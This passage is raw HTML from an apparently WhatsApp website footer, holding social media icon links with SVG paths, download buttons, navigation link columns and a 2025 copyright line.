                            </svg></a><a aria-label="Youtube" href="https://www.youtube.com/channel/UCAuerig2N-RZWJT8x75V9yw" class="_afwh _adig _ao_2 _ad_c" data-ms="&#123;&quot;creative&quot;:&quot;link&quot;,&quot;creative_detail&quot;:&quot;Footer_YouTube_FinePrint_Link&quot;&#125;" target="_blank" data-lnfb-mode="ie" style="background-color:;border-color:;fill:;stroke:;"><svg width="23" height="16" viewBox="0 0 23 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="_wauiIcon__youtube _adid _arcp _afbl">
                                <path d="M22.0088 5.95168C22.0583 4.52034 21.7452 3.0997 21.0988 1.82168C20.6602 1.29728 20.0515 0.943393 19.3788 0.821683C16.5963 0.569209 13.8023 0.465727 11.0088 0.511683C8.22546 0.463642 5.44152 0.563783 2.66882 0.811683C2.12064 0.9114 1.61333 1.16853 1.20882 1.55168C0.308816 2.38168 0.208816 3.80168 0.108816 5.00168C-0.036272 7.15925 -0.036272 9.32412 0.108816 11.4817C0.137746 12.1571 0.23831 12.8275 0.408816 13.4817C0.529391 13.9867 0.773339 14.454 1.11882 14.8417C1.52608 15.2451 2.0452 15.5169 2.60882 15.6217C4.76473 15.8878 6.93703 15.9981 9.10882 15.9517C12.6088 16.0017 15.6788 15.9517 19.3088 15.6717C19.8863 15.5733 20.42 15.3012 20.8388 14.8917C21.1188 14.6116 21.3279 14.2688 21.4488 13.8917C21.8064 12.7943 21.9821 11.6458 21.9688 10.4917C22.0088 9.93168 22.0088 6.55168 22.0088 5.95168ZM8.74882 11.0917V4.90168L14.6688 8.01168C13.0088 8.93168 10.8188 9.97168 8.74882 11.0917Z" fill="currentColor"></path>
                            </svg></a><a aria-label="Instagram" href="https://www.instagram.com/whatsapp/?hl=en" class="_afwh _adig _ao_2 _ad_c" data-ms="&#123;&quot;creative&quot;:&quot;link&quot;,&quot;creative_detail&quot;:&quot;Footer_Instagram_FinePrint_Link&quot;&#125;" target="_blank" data-lnfb-mode="ie" style="background-color:;border-color:;fill:;stroke:;"><svg width="20" height="21" viewBox="0 0 20 21" fill="none" xmlns="http://www.w3.org/2000/svg" class="_wauiIcon__instagram _adid _arcp _afbl">
                                <path d="M15.34 3.96C15.1027 3.96 14.8707 4.03038 14.6733 4.16224C14.476 4.29409 14.3222 4.48151 14.2313 4.70078C14.1405 4.92005 14.1168 5.16133 14.1631 5.39411C14.2094 5.62689 14.3236 5.84071 14.4915 6.00853C14.6593 6.17635 14.8731 6.29064 15.1059 6.33694C15.3387 6.38324 15.5799 6.35948 15.7992 6.26866C16.0185 6.17783 16.2059 6.02402 16.3378 5.82668C16.4696 5.62935 16.54 5.39734 16.54 5.16C16.54 4.84174 16.4136 4.53652 16.1885 4.31147C15.9635 4.08643 15.6583 3.96 15.34 3.96ZM19.94 6.38C19.9206 5.5503 19.7652 4.7294 19.48 3.95C19.2257 3.28313 18.83 2.67928 18.32 2.18C17.8248 1.66743 17.2196 1.27418 16.55 1.03C15.7727 0.736161 14.9508 0.57721 14.12 0.56C13.06 0.5 12.72 0.5 10 0.5C7.28 0.5 6.94 0.5 5.88 0.56C5.04915 0.57721 4.22734 0.736161 3.45 1.03C2.78168 1.27665 2.17693 1.66956 1.68 2.18C1.16743 2.67518 0.774176 3.28044 0.53 3.95C0.236161 4.72734 0.07721 5.54915 0.0599999 6.38C-5.58794e-08 7.44 0 7.78 0 10.5C0 13.22 -5.58794e-08 13.56 0.0599999 14.62C0.07721 15.4508 0.236161 16.2727 0.53 17.05C0.774176 17.7196 1.16743 18.3248 1.68 18.82C2.17693 19.3304 2.78168 19.7234 3.45 19.97C4.22734 20.2638 5.04915 20.4228 5.88 20.44C6.94 20.5 7.28 20.5 10 20.5C12.72 20.5 13.06 20.5 14.12 20.44C14.9508 20.4228 15.7727 20.2638 16.55 19.97C17.2196 19.7258 17.8248 19.3326 18.32 18.82C18.8322 18.3226 19.2283 17.7182 19.48 17.05C19.7652 16.2706 19.9206 15.4497 19.94 14.62C19.94 13.56 20 13.22 20 10.5C20 7.78 20 7.44 19.94 6.38ZM18.14 14.5C18.1327 15.1348 18.0178 15.7637 17.8 16.36C17.6403 16.7952 17.3839 17.1884 17.05 17.51C16.7256 17.8405 16.3332 18.0964 15.9 18.26C15.3037 18.4778 14.6748 18.5927 14.04 18.6C13.04 18.65 12.67 18.66 10.04 18.66C7.41 18.66 7.04 18.66 6.04 18.6C5.38089 18.6123 4.72459 18.5109 4.1 18.3C3.68578 18.1281 3.31136 17.8728 3 17.55C2.66809 17.2287 2.41484 16.8352 2.26 16.4C2.01586 15.7952 1.88044 15.1519 1.86 14.5C1.86 13.5 1.8 13.13 1.8 10.5C1.8 7.87 1.8 7.5 1.86 6.5C1.86448 5.85106 1.98295 5.20795 2.21 4.6C2.38605 4.17791 2.65627 3.80166 3 3.5C3.30381 3.15617 3.67929 2.8831 4.1 2.7C4.70955 2.48004 5.352 2.36508 6 2.36C7 2.36 7.37 2.3 10 2.3C12.63 2.3 13 2.3 14 2.36C14.6348 2.36728 15.2637 2.48225 15.86 2.7C16.3144 2.86865 16.7223 3.14285 17.05 3.5C17.3777 3.80718 17.6338 4.18273 17.8 4.6C18.0223 5.20893 18.1373 5.85178 18.14 6.5C18.19 7.5 18.2 7.87 18.2 10.5C18.2 13.13 18.19 13.5 18.14 14.5ZM10 5.37C8.98581 5.37198 7.99496 5.67453 7.15265 6.23942C6.31035 6.80431 5.65438 7.6062 5.26763 8.54375C4.88089 9.48131 4.78072 10.5125 4.97979 11.5069C5.17886 12.5014 5.66824 13.4145 6.38608 14.131C7.10392 14.8474 8.01801 15.335 9.01286 15.5321C10.0077 15.7293 11.0387 15.6271 11.9755 15.2385C12.9123 14.85 13.7129 14.1924 14.2761 13.349C14.8394 12.5056 15.14 11.5142 15.14 10.5C15.1413 9.8251 15.0092 9.15661 14.7512 8.53296C14.4933 7.90931 14.1146 7.34281 13.6369 6.86605C13.1592 6.38929 12.5919 6.01168 11.9678 5.75493C11.3436 5.49818 10.6749 5.36736 10 5.37ZM10 13.83C9.34139 13.83 8.69757 13.6347 8.14995 13.2688C7.60234 12.9029 7.17552 12.3828 6.92348 11.7743C6.67144 11.1659 6.6055 10.4963 6.73398 9.85035C6.86247 9.20439 7.17963 8.61104 7.64533 8.14533C8.11104 7.67963 8.70439 7.36247 9.35035 7.23398C9.99631 7.1055 10.6659 7.17144 11.2743 7.42348C11.8828 7.67552 12.4029 8.10234 12.7688 8.64995C13.1347 9.19757 13.33 9.84139 13.33 10.5C13.33 10.9373 13.2439 11.3703 13.0765 11.7743C12.9092 12.1784 12.6639 12.5454 12.3547 12.8547C12.0454 13.1639 11.6784 13.4092 11.2743 13.5765C10.8703 13.7439 10.4373 13.83 10 13.83Z" fill="currentColor"></path>
                            </svg></a><a aria-label="Facebook" href="https://www.facebook.com/profile.php?id=100064758844406" class="_afwh _adig _ao_2 _ad_c" data-ms="&#123;&quot;creative&quot;:&quot;link&quot;,&quot;creative_detail&quot;:&quot;Footer_Facebook_FinePrint_Link&quot;&#125;" target="_blank" style="background-color:;border-color:;fill:;stroke:;"><svg width="11" height="21" viewBox="0 0 11 21" fill="none" xmlns="http://www.w3.org/2000/svg" class="_wauiIcon__facebook-alt _adid _arcp _afbl">
                                <path d="M8.51 3.82003H10.39V0.64003C9.47975 0.545377 8.56516 0.498646 7.65 0.50003C4.93 0.50003 3.07 2.16003 3.07 5.20003V7.82003H0V11.38H3.07V20.5H6.75V11.38H9.81L10.27 7.82003H6.75V5.55003C6.75 4.50003 7.03 3.82003 8.51 3.82003Z" fill="currentColor"></path>
                            </svg></a></div>
                </div>
                <div class="_9t2j"><span class="_9uog"><a href="https://www.whatsapp.com/" class="_asnw _9vcv" data-ms="&#123;&quot;creative&quot;:&quot;link&quot;,&quot;creative_detail&quot;:&quot;Footer_WhatsApp_MobileLogo_Link&quot;&#125;" data-lnfb-mode="ie"><span class="_advp _aeam"><img class="_aeok" alt="WhatsApp Main Logo" src="https://static.whatsapp.net/rsrc.php/ya/r/GjxmhIpug9B.svg" /></span></a></span>
                    <div class="_9tar _9ta3 _9ta5 _9ta7 _9ta- _9taw _9t2l">
                        <div class="_9vd6 _9t33 _9bij _9biz _9bhb _9v12 _9taw _9tb0 _9u5z"><a href="https://www.whatsapp.com/" class="_asnw _9vcv" data-ms="&#123;&quot;creative&quot;:&quot;link&quot;,&quot;creative_detail&quot;:&quot;Footer_WhatsApp_MobileLogo_Link&quot;&#125;" data-lnfb-mode="ie"><span class="_advp _aeam"><img class="_aeok" alt="WhatsApp Main Logo" src="https://static.whatsapp.net/rsrc.php/yA/r/hbGnlm1gXME.svg" /></span></a><span class="_ae_s">
                                <div class="_asz5"><a href="https://www.whatsapp.com/download" class="_aeo8 _advo _9vcv _9u4o _9u4i _9scc _9scs _9sep" data-ms="&#123;&quot;creative&quot;:&quot;link&quot;,&quot;creative_detail&quot;:&quot;Footer_Unsupported_Download_Button&quot;&#125;" data-lnfb-mode="ie"><span class="_advp _aeam">Download</span><span><svg width="16" height="16" viewBox="0 0 16 16" fill="none" class="_wauiIcon__download-alternative _agnt _9u4c">
                                                <path fill-rule="evenodd" clip-rule="evenodd" d="M13.75 13.75C13.75 14.1642 13.4142 14.5 13 14.5L3 14.5C2.58579 14.5 2.25 14.1642 2.25 13.75C2.25 13.3358 2.58579 13 3 13L13 13C13.4142 13 13.75 13.3358 13.75 13.75Z" fill="currentColor"></path>
                                                <path fill-rule="evenodd" clip-rule="evenodd" d="M8.7487 2C8.7487 1.58579 8.41291 1.25 7.9987 1.25C7.58448 1.25 7.2487 1.58579 7.2487 2L7.2487 9.53955L3.19233 5.51449C2.89831 5.22274 2.42344 5.22458 2.13168 5.5186C1.83993 5.81263 1.84177 6.2875 2.13579 6.57925L7.46912 11.8714C7.76154 12.1616 8.23325 12.1616 8.52567 11.8714L13.859 6.57926C14.153 6.2875 14.1549 5.81263 13.8631 5.5186C13.5714 5.22458 13.0965 5.22274 12.8025 5.51449L8.7487 9.53697L8.7487 2Z" fill="currentColor"></path>
                                            </svg></span></a></div>
                            </span></div>
                        <div class="_9vd6 _9t33 _9bii _9biz _9biu _9v12 _9taw _9tb0 _9u6_ _9u71 _9sey _9u5w _9u5z" style="background-color:transparent;">
                            <div class="_9vd5 _ad_0 _ad_b _9sey _9sc_ _9sey" style="color:#FFFFFF;">
                                <div class="_8l_f _52ju" style="box-sizing:border-box;">
                                    <h4>What we do</h4>
                                </div>
                            </div><a href="https://www.whatsapp.com/stayconnected" class="_aeo9 _asnw _9vcv _9scy _9sep" data-ms="&#123;&quot;creative&quot;:&quot;link&quot;,&quot;creative_detail&quot;:&quot;Footer_Features_WhatWeDo_Link&quot;&#125;" data-lnfb-mode="ie"><span class="_advp _aeam"><span class="_9vg3 _9vd5 _aenq _9sep _9vd5 _aenq _aj1b" style="color:#FFFFFF;">Features</span></span></a><a href="https://blog.whatsapp.com/" class="_aeo9 _asnw _9vcv _9scy _9sep" data-ms="&#123;&quot;creative&quot;:&quot;link&quot;,&quot;creative_detail&quot;:&quot;Footer_Blog_WhatWeDo_Link&quot;&#125;" data-lnfb-mode="ie"><span class="_advp _aeam"><span class="_9vg3 _9vd5 _aenq _9sep _9vd5 _aenq _aj1b" style="color:#FFFFFF;">Blog</span></span></a><a href="https://www.whatsapp.com/security" class="_aeo9 _asnw _9vcv _9scy _9sep" data-ms="&#123;&quot;creative&quot;:&quot;link&quot;,&quot;creative_detail&quot;:&quot;Footer_Security_WhatWeDo_Link&quot;&#125;" data-lnfb-mode="ie"><span class="_advp _aeam"><span class="_9vg3 _9vd5 _aenq _9sep _9vd5 _aenq _aj1b" style="color:#FFFFFF;">Security</span></span></a><a href="https://business.whatsapp.com/" class="_aeo9 _asnw _9vcv _9sep" data-ms="&#123;&quot;creative&quot;:&quot;link&quot;,&quot;creative_detail&quot;:&quot;Footer_ForBusiness_WhatWeDo_Link&quot;&#125;" data-lnfb-mode="ie"><span class="_advp _aeam"><span class="_9vg3 _9vd5 _aenq _9sep _9vd5 _aenq _aj1b" style="color:#FFFFFF;">For Business</span></span></a>
                        </div>
                        <div class="_9vd6 _9t33 _9bii _9biz _9biu _9v12 _9taw _9tb0 _9u6_ _9u71 _9sey _9u5w _9u5z" style="background-color:transparent;">
                            <div class="_9vd5 _ad_0 _ad_b _9sey _9sc_ _9sey" style="color:#FFFFFF;">
                                <div class="_8l_f _52ju" style="box-sizing:border-box;">
                                    <h4>Who we are</h4>
                                </div>
                            </div><a href="https://www.whatsapp.com/about" class="_aeo9 _asnw _9vcv _9scy _9sep" data-ms="&#123;&quot;creative&quot;:&quot;link&quot;,&quot;creative_detail&quot;:&quot;Footer_AboutUs_WhoWeAre_Link&quot;&#125;" data-lnfb-mode="ie"><span class="_advp _aeam"><span class="_9vg3 _9vd5 _aenq _9sep _9vd5 _aenq _aj1b" style="color:#FFFFFF;">About us</span></span></a><a href="https://www.whatsapp.com/join" class="_aeo9 _asnw _9vcv _9scy _9sep" data-ms="&#123;&quot;creative&quot;:&quot;link&quot;,&quot;creative_detail&quot;:&quot;Footer_Careers_WhoWeAre_Link&quot;&#125;" data-lnfb-mode="ie"><span class="_advp _aeam"><span class="_9vg3 _9vd5 _aenq _9sep _9vd5 _aenq _aj1b" style="color:#FFFFFF;">Careers</span></span></a><a href="https://www.facebook.com/brand/resources/whatsapp/whatsapp-brand" class="_aeo9 _asnw _9vcv _9scy _9sep" data-ms="&#123;&quot;creative&quot;:&quot;link&quot;,&quot;creative_detail&quot;:&quot;Footer_BrandCenter_WhoWeAre_Link&quot;&#125;" target="_blank"><span class="_advp _aeam"><span class="_9vg3 _9vd5 _aenq _9sep _9vd5 _aenq _aj1b" style="color:#FFFFFF;">Brand Center</span></span></a><a href="https://www.whatsapp.com/privacy" class="_aeo9 _asnw _9vcv _9sep" data-ms="&#123;&quot;creative&quot;:&quot;link&quot;,&quot;creative_detail&quot;:&quot;Footer_Privacy_WhoWeAre_Link&quot;&#125;" data-lnfb-mode="ie"><span class="_advp _aeam"><span class="_9vg3 _9vd5 _aenq _9sep _9vd5 _aenq _aj1b" style="color:#FFFFFF;">Privacy</span></span></a>
                        </div>
                        <div class="_9vd6 _9t33 _9bii _9biz _9biu _9v12 _9taw _9tb0 _9u6_ _9u71 _9sey _9u5w _9u5z" style="background-color:transparent;">
                            <div class="_9vd5 _ad_0 _ad_b _9sey _9sc_ _9sey" style="color:#FFFFFF;">
                                <div class="_8l_f _52ju" style="box-sizing:border-box;">
                                    <h4>Use WhatsApp</h4>
                                </div>
                            </div><a href="https://www.whatsapp.com/android" class="_aeo9 _asnw _9vcv _9scy _9sep" data-ms="&#123;&quot;creative&quot;:&quot;link&quot;,&quot;creative_detail&quot;:&quot;Footer_Android_UseWhatsApp_Link&quot;&#125;" data-lnfb-mode="ie"><span class="_advp _aeam"><span class="_9vg3 _9vd5 _aenq _9sep _9vd5 _aenq _aj1b" style="color:#FFFFFF;">Android</span></span></a><a href="https://www.whatsapp.com/download" class="_aeo9 _asnw _9vcv _9scy _9sep" data-ms="&#123;&quot;creative&quot;:&quot;link&quot;,&quot;creative_detail&quot;:&quot;Footer_Iphone_UseWhatsApp_Link&quot;&#125;" data-lnfb-mode="ie"><span class="_advp _aeam"><span class="_9vg3 _9vd5 _aenq _9sep _9vd5 _aenq _aj1b" style="color:#FFFFFF;">iPhone</span></span></a><a href="https://www.whatsapp.com/download" class="_aeo9 _asnw _9vcv _9scy _9sep" data-ms="&#123;&quot;creative&quot;:&quot;link&quot;,&quot;creative_detail&quot;:&quot;Footer_MacPc_UseWhatsApp_Link&quot;&#125;" data-lnfb-mode="ie"><span class="_advp _aeam"><span class="_9vg3 _9vd5 _aenq _9sep _9vd5 _aenq _aj1b" style="color:#FFFFFF;">Mac/PC</span></span></a><a href="https://web.whatsapp.com/" class="_aeo9 _asnw _9vcv _9sep" data-ms="&#123;&quot;creative&quot;:&quot;link&quot;,&quot;creative_detail&quot;:&quot;Footer_WhatsAppWeb_UseWhatsApp_Link&quot;&#125;" data-lnfb-mode="ie"><span class="_advp _aeam"><span class="_9vg3 _9vd5 _aenq _9sep _9vd5 _aenq _aj1b" style="color:#FFFFFF;">WhatsApp Web</span></span></a>
                        </div>
                        <div class="_9vd6 _9t33 _9bii _9biz _9biu _9v12 _9taw _9tb0 _9u6_ _9u71 _9sey _9u5w _9u5z" style="background-color:transparent;">
                            <div class="_9vd5 _ad_0 _ad_b _9sey _9sc_ _9sey" style="color:#FFFFFF;">
                                <div class="_8l_f _52ju" style="box-sizing:border-box;">
                                    <h4>Need help?</h4>
                                </div>
                            </div><a id="contact_us_link_footer" href="https://www.whatsapp.com/contact" class="_aeo9 _asnw _9vcv _9scy _9sep" data-ms="&#123;&quot;creative&quot;:&quot;link&quot;,&quot;creative_detail&quot;:&quot;Footer_ContactUs_NeedHelp_Link&quot;&#125;" data-lnfb-mode="ie"><span class="_advp _aeam"><span class="_9vg3 _9vd5 _aenq _9sep _9vd5 _aenq _aj1b" style="color:#FFFFFF;">Contact Us</span></span></a><a href="https://faq.whatsapp.com/" class="_aeo9 _asnw _9vcv _9scy _9sep" data-ms="&#123;&quot;creative&quot;:&quot;link&quot;,&quot;creative_detail&quot;:&quot;Footer_HelpCenter_NeedHelp_Link&quot;&#125;" data-lnfb-mode="ie"><span class="_advp _aeam"><span class="_9vg3 _9vd5 _aenq _9sep _9vd5 _aenq _aj1b" style="color:#FFFFFF;">Help Center</span></span></a><a href="https://www.whatsapp.com/download" class="_aeo9 _asnw _9vcv _9scy _9sep" data-ms="&#123;&quot;creative&quot;:&quot;link&quot;,&quot;creative_detail&quot;:&quot;Footer_Apps_NeedHelp_Link&quot;&#125;" data-lnfb-mode="ie"><span class="_advp _aeam"><span class="_9vg3 _9vd5 _aenq _9sep _9vd5 _aenq _aj1b" style="color:#FFFFFF;">Apps</span></span></a><a href="https://www.whatsapp.com/security/advisories" class="_aeo9 _asnw _9vcv _9sep" data-ms="&#123;&quot;creative&quot;:&quot;link&quot;,&quot;creative_detail&quot;:&quot;Footer_SecurityAdvisories_NeedHelp_Link&quot;&#125;" data-lnfb-mode="ie"><span class="_advp _aeam"><span class="_9vg3 _9vd5 _aenq _9sep _9vd5 _aenq _aj1b" style="color:#FFFFFF;">Security Advisories</span></span></a>
                        </div>
                    </div>
                </div>
                <div class="_9tar _9ta3 _9ta5 _9ta8 _9ta- _9tau _9uo7 _aeol"><span class="_ae_s">
                        <div class="_asz5"><a href="https://www.whatsapp.com/download" class="_aeo8 _advo _9vcv _9u4o _9u4i _9scc _9scs _9sep" data-ms="&#123;&quot;creative&quot;:&quot;link&quot;,&quot;creative_detail&quot;:&quot;Footer_Unsupported_Download_Button&quot;&#125;" data-lnfb-mode="ie"><span class="_advp _aeam">Download</span><span><svg width="16" height="16" viewBox="0 0 16 16" fill="none" class="_wauiIcon__download-alternative _agnt _9u4c">
                                        <path fill-rule="evenodd" clip-rule="evenodd" d="M13.75 13.75C13.75 14.1642 13.4142 14.5 13 14.5L3 14.5C2.58579 14.5 2.25 14.1642 2.25 13.75C2.25 13.3358 2.58579 13 3 13L13 13C13.4142 13 13.75 13.3358 13.75 13.75Z" fill="currentColor"></path>
                                        <path fill-rule="evenodd" clip-rule="evenodd" d="M8.7487 2C8.7487 1.58579 8.41291 1.25 7.9987 1.25C7.58448 1.25 7.2487 1.58579 7.2487 2L7.2487 9.53955L3.19233 5.51449C2.89831 5.22274 2.42344 5.22458 2.13168 5.5186C1.83993 5.81263 1.84177 6.2875 2.13579 6.57925L7.46912 11.8714C7.76154 12.1616 8.23325 12.1616 8.52567 11.8714L13.859 6.57926C14.153 6.2875 14.1549 5.81263 13.8631 5.5186C13.5714 5.22458 13.0965 5.22274 12.8025 5.51449L8.7487 9.53697L8.7487 2Z" fill="currentColor"></path>
                                    </svg></span></a></div>
                    </span>
                    <div class="_9tar _9ta3 _9ta5 _9ta8 _9tau _9uo7 _ae_u"><a aria-label="Twitter" href="https://x.com/whatsapp" class="_afwh _adig _ao_2 _ad_c" data-ms="&#123;&quot;creative&quot;:&quot;link&quot;,&quot;creative_detail&quot;:&quot;Footer_Twitter_FinePrint_Link&quot;&#125;" target="_blank" data-lnfb-mode="ie" style="background-color:;border-color:;fill:;stroke:;"><svg viewBox="0 0 1200 1227" width="48" height="48" fill="none" xmlns="http://www.w3.org/2000/svg" class="_aghm _adid _arcp _afbl">
                                <path d="M714.163 519.284L1160.89 0H1055.03L667.137 450.887L357.328 0H0L468.492 681.821L0 1226.37H105.866L515.491 750.218L842.672 1226.37H1200L714.137 519.284H714.163ZM569.165 687.828L521.697 619.934L144.011 79.6944H306.615L611.412 515.685L658.88 583.579L1055.08 1150.3H892.476L569.165 687.854V687.828Z" fill="currentColor"></path>
                            </svg></a><a aria-label="Youtube" href="https://www.youtube.com/channel/UCAuerig2N-RZWJT8x75V9yw" class="_afwh _adig _ao_2 _ad_c" data-ms="&#123;&quot;creative&quot;:&quot;link&quot;,&quot;creative_detail&quot;:&quot;Footer_YouTube_FinePrint_Link&quot;&#125;" target="_blank" data-lnfb-mode="ie" style="background-color:;border-color:;fill:;stroke:;"><svg width="23" height="16" viewBox="0 0 23 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="_wauiIcon__youtube _adid _arcp _afbl">
                                <path d="M22.0088 5.95168C22.0583 4.52034 21.7452 3.0997 21.0988 1.82168C20.6602 1.29728 20.0515 0.943393 19.3788 0.821683C16.5963 0.569209 13.8023 0.465727 11.0088 0.511683C8.22546 0.463642 5.44152 0.563783 2.66882 0.811683C2.12064 0.9114 1.61333 1.16853 1.20882 1.55168C0.308816 2.38168 0.208816 3.80168 0.108816 5.00168C-0.036272 7.15925 -0.036272 9.32412 0.108816 11.4817C0.137746 12.1571 0.23831 12.8275 0.408816 13.4817C0.529391 13.9867 0.773339 14.454 1.11882 14.8417C1.52608 15.2451 2.0452 15.5169 2.60882 15.6217C4.76473 15.8878 6.93703 15.9981 9.10882 15.9517C12.6088 16.0017 15.6788 15.9517 19.3088 15.6717C19.8863 15.5733 20.42 15.3012 20.8388 14.8917C21.1188 14.6116 21.3279 14.2688 21.4488 13.8917C21.8064 12.7943 21.9821 11.6458 21.9688 10.4917C22.0088 9.93168 22.0088 6.55168 22.0088 5.95168ZM8.74882 11.0917V4.90168L14.6688 8.01168C13.0088 8.93168 10.8188 9.97168 8.74882 11.0917Z" fill="currentColor"></path>
                            </svg></a><a aria-label="Instagram" href="https://www.instagram.com/whatsapp/?hl=en" class="_afwh _adig _ao_2 _ad_c" data-ms="&#123;&quot;creative&quot;:&quot;link&quot;,&quot;creative_detail&quot;:&quot;Footer_Instagram_FinePrint_Link&quot;&#125;" target="_blank" data-lnfb-mode="ie" style="background-color:;border-color:;fill:;stroke:;"><svg width="20" height="21" viewBox="0 0 20 21" fill="none" xmlns="http://www.w3.org/2000/svg" class="_wauiIcon__instagram _adid _arcp _afbl">
                                <path d="M15.34 3.96C15.1027 3.96 14.8707 4.03038 14.6733 4.16224C14.476 4.29409 14.3222 4.48151 14.2313 4.70078C14.1405 4.92005 14.1168 5.16133 14.1631 5.39411C14.2094 5.62689 14.3236 5.84071 14.4915 6.00853C14.6593 6.17635 14.8731 6.29064 15.1059 6.33694C15.3387 6.38324 15.5799 6.35948 15.7992 6.26866C16.0185 6.17783 16.2059 6.02402 16.3378 5.82668C16.4696 5.62935 16.54 5.39734 16.54 5.16C16.54 4.84174 16.4136 4.53652 16.1885 4.31147C15.9635 4.08643 15.6583 3.96 15.34 3.96ZM19.94 6.38C19.9206 5.5503 19.7652 4.7294 19.48 3.95C19.2257 3.28313 18.83 2.67928 18.32 2.18C17.8248 1.66743 17.2196 1.27418 16.55 1.03C15.7727 0.736161 14.9508 0.57721 14.12 0.56C13.06 0.5 12.72 0.5 10 0.5C7.28 0.5 6.94 0.5 5.88 0.56C5.04915 0.57721 4.22734 0.736161 3.45 1.03C2.78168 1.27665 2.17693 1.66956 1.68 2.18C1.16743 2.67518 0.774176 3.28044 0.53 3.95C0.236161 4.72734 0.07721 5.54915 0.0599999 6.38C-5.58794e-08 7.44 0 7.78 0 10.5C0 13.22 -5.58794e-08 13.56 0.0599999 14.62C0.07721 15.4508 0.236161 16.2727 0.53 17.05C0.774176 17.7196 1.16743 18.3248 1.68 18.82C2.17693 19.3304 2.78168 19.7234 3.45 19.97C4.22734 20.2638 5.04915 20.4228 5.88 20.44C6.94 20.5 7.28 20.5 10 20.5C12.72 20.5 13.06 20.5 14.12 20.44C14.9508 20.4228 15.7727 20.2638 16.55 19.97C17.2196 19.7258 17.8248 19.3326 18.32 18.82C18.8322 18.3226 19.2283 17.7182 19.48 17.05C19.7652 16.2706 19.9206 15.4497 19.94 14.62C19.94 13.56 20 13.22 20 10.5C20 7.78 20 7.44 19.94 6.38ZM18.14 14.5C18.1327 15.1348 18.0178 15.7637 17.8 16.36C17.6403 16.7952 17.3839 17.1884 17.05 17.51C16.7256 17.8405 16.3332 18.0964 15.9 18.26C15.3037 18.4778 14.6748 18.5927 14.04 18.6C13.04 18.65 12.67 18.66 10.04 18.66C7.41 18.66 7.04 18.66 6.04 18.6C5.38089 18.6123 4.72459 18.5109 4.1 18.3C3.68578 18.1281 3.31136 17.8728 3 17.55C2.66809 17.2287 2.41484 16.8352 2.26 16.4C2.01586 15.7952 1.88044 15.1519 1.86 14.5C1.86 13.5 1.8 13.13 1.8 10.5C1.8 7.87 1.8 7.5 1.86 6.5C1.86448 5.85106 1.98295 5.20795 2.21 4.6C2.38605 4.17791 2.65627 3.80166 3 3.5C3.30381 3.15617 3.67929 2.8831 4.1 2.7C4.70955 2.48004 5.352 2.36508 6 2.36C7 2.36 7.37 2.3 10 2.3C12.63 2.3 13 2.3 14 2.36C14.6348 2.36728 15.2637 2.48225 15.86 2.7C16.3144 2.86865 16.7223 3.14285 17.05 3.5C17.3777 3.80718 17.6338 4.18273 17.8 4.6C18.0223 5.20893 18.1373 5.85178 18.14 6.5C18.19 7.5 18.2 7.87 18.2 10.5C18.2 13.13 18.19 13.5 18.14 14.5ZM10 5.37C8.98581 5.37198 7.99496 5.67453 7.15265 6.23942C6.31035 6.80431 5.65438 7.6062 5.26763 8.54375C4.88089 9.48131 4.78072 10.5125 4.97979 11.5069C5.17886 12.5014 5.66824 13.4145 6.38608 14.131C7.10392 14.8474 8.01801 15.335 9.01286 15.5321C10.0077 15.7293 11.0387 15.6271 11.9755 15.2385C12.9123 14.85 13.7129 14.1924 14.2761 13.349C14.8394 12.5056 15.14 11.5142 15.14 10.5C15.1413 9.8251 15.0092 9.15661 14.7512 8.53296C14.4933 7.90931 14.1146 7.34281 13.6369 6.86605C13.1592 6.38929 12.5919 6.01168 11.9678 5.75493C11.3436 5.49818 10.6749 5.36736 10 5.37ZM10 13.83C9.34139 13.83 8.69757 13.6347 8.14995 13.2688C7.60234 12.9029 7.17552 12.3828 6.92348 11.7743C6.67144 11.1659 6.6055 10.4963 6.73398 9.85035C6.86247 9.20439 7.17963 8.61104 7.64533 8.14533C8.11104 7.67963 8.70439 7.36247 9.35035 7.23398C9.99631 7.1055 10.6659 7.17144 11.2743 7.42348C11.8828 7.67552 12.4029 8.10234 12.7688 8.64995C13.1347 9.19757 13.33 9.84139 13.33 10.5C13.33 10.9373 13.2439 11.3703 13.0765 11.7743C12.9092 12.1784 12.6639 12.5454 12.3547 12.8547C12.0454 13.1639 11.6784 13.4092 11.2743 13.5765C10.8703 13.7439 10.4373 13.83 10 13.83Z" fill="currentColor"></path>
                            </svg></a><a aria-label="Facebook" href="https://www.facebook.com/profile.php?id=100064758844406" class="_afwh _adig _ao_2 _ad_c" data-ms="&#123;&quot;creative&quot;:&quot;link&quot;,&quot;creative_detail&quot;:&quot;Footer_Facebook_FinePrint_Link&quot;&#125;" target="_blank" style="background-color:;border-color:;fill:;stroke:;"><svg width="11" height="21" viewBox="0 0 11 21" fill="none" xmlns="http://www.w3.org/2000/svg" class="_wauiIcon__facebook-alt _adid _arcp _afbl">
                                <path d="M8.51 3.82003H10.39V0.64003C9.47975 0.545377 8.56516 0.498646 7.65 0.50003C4.93 0.50003 3.07 2.16003 3.07 5.20003V7.82003H0V11.38H3.07V20.5H6.75V11.38H9.81L10.27 7.82003H6.75V5.55003C6.75 4.50003 7.03 3.82003 8.51 3.82003Z" fill="currentColor"></path>
                            </svg></a></div>
                </div>
                <div class="_9t2k">
                    <div class="_9t2m"><span class="_aeom">
                            <div class="_9tar _9ta3 _9ta5 _9ta8 _9u69 _9taw _ae_v"><span class="_aeef">
                                    <p class="_9vd7">2025 © WhatsApp LLC</p>
                                </span><a href="https://www.whatsapp.com/legal/" class="_aeo9 _9vcv _9vcx _9sep" data-ms="&#123;&quot;creative&quot;:&quot;link&quot;,&quot;creative_detail&quot;:&quot;Footer_TermsAndPrivacyPolicy_FinePrint_Link&quot;&#125;" data-lnfb-mode="ie"><span class="_advp _aeam"><span class="_9vg3 _9sep _aj1b" style="color:#F0F4F9;">Terms &amp; Privacy Policy</span></span></a><span><a href="https://www.whatsapp.com/sitemap" target="_self" class="_asnw _9vcv" data-ms="&#123;&quot;creative&quot;:&quot;link&quot;&#125;" data-lnfb-mode="ie"><span class="_advp _aeam">
                                            <h6 class="_9vd5 _9sc- _9sd4 _9t31" style="color:#FFFFFF;">Sitemap</h6>
                                        </span></a></span></div>
                        </span><span class="_aeom">
